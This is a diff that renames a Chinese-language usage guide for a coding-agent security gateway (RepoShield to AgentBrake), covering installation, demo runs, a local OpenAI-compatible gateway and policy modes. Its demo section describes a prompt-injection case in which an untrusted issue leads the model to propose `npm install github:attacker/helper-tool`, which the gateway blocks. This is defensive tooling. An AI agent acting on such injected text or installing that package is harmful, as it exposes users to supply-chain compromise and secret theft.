@@ -1,11 +1,11 @@
-# RepoShield v0.3 第三阶段使用说明
+# AgentBrake v0.3 第三阶段使用说明
 
-v0.3 的重点是把 RepoShield 接到 agent runtime 链路里，而不是只在 CLI transcript 层解析动作。新增 Gateway 后，代码智能体可以把 OpenAI-compatible 请求发送到 RepoShield，由 RepoShield 做 pre-call trace、post-call InstructionIR parsing、ActionIR lowering、策略决策、审批请求和审计记录。
+v0.3 的重点是把 AgentBrake 接到 agent runtime 链路里，而不是只在 CLI transcript 层解析动作。新增 Gateway 后，代码智能体可以把 OpenAI-compatible 请求发送到 AgentBrake，由 AgentBrake 做 pre-call trace、post-call InstructionIR parsing、ActionIR lowering、策略决策、审批请求和审计记录。
 
 ## 1. 安装与验证
 
 ```bash
-cd reposhield_plugin_v0.3
+cd agentbrake_plugin_v0.3
 python -m pip install -e '.[test]'
 python -m compileall -q src
 pytest -q
@@ -14,7 +14,7 @@ pytest -q
 ## 2. Gateway demo
 
 ```bash
-PYTHONPATH=src python -m reposhield gateway-demo --workdir reports/gateway_demo_run
+PYTHONPATH=src python -m agentbrake gateway-demo --workdir reports/gateway_demo_run
 ```
 
 预期结果：不可信 issue 诱导模型提出 `npm install github:attacker/helper-tool`，Gateway 将 assistant tool_call 解析为 InstructionIR，再 lowering 成 ActionIR，最终因为不可信来源影响、合同外依赖安装、Git URL dependency、lifecycle、sandbox network/secret 风险而阻断。
@@ -25,7 +25,7 @@ PYTHONPATH=src python -m reposhield gateway-demo --workdir reports/gateway_demo_
 
 ```json
 {
-  "model": "reposhield/local-heuristic",
+  "model": "agentbrake/local-heuristic",
   "task": "修复登录按钮点击无响应的问题，并运行测试。",
   "messages": [
     {"role": "user", "content": "修复登录按钮点击无响应的问题，并运行测试。"}
@@ -45,7 +45,7 @@ PYTHONPATH=src python -m reposhield gateway-demo --workdir reports/gateway_demo_
 运行：
 
 ```bash
-PYTHONPATH=src python -m reposhield gateway-simulate \
+PYTHONPATH=src python -m agentbrake gateway-simulate \
   --repo ./demo_repo \
   --request request.json \
   --policy-mode enforce
@@ -54,7 +54,7 @@ PYTHONPATH=src python -m reposhield gateway-simulate \
 ## 4. 启动本地 Gateway
 
 ```bash
-PYTHONPATH=src python -m reposhield gateway-start \
+PYTHONPATH=src python -m agentbrake gateway-start \
   --repo ./demo_repo \
   --host 127.0.0.1 \
   --port 8765
@@ -71,8 +71,8 @@ agent 配置示例：
 
 ```text
 base_url = http://127.0.0.1:8765/v1
-api_key  = reposhield-local
-model    = reposhield/local-heuristic
+api_key  = agentbrake-local
+model    = agentbrake/local-heuristic
 ```
 
 ## 5. 策略模式
@@ -89,7 +89,7 @@ warn          给出 warning，尽量降级到 sandbox
 命令示例：
 
 ```bash
-PYTHONPATH=src python -m reposhield gateway-demo \
+PYTHONPATH=src python -m agentbrake gateway-demo \
   --workdir reports/gateway_demo_observe \
   --policy-mode observe_only
 ```
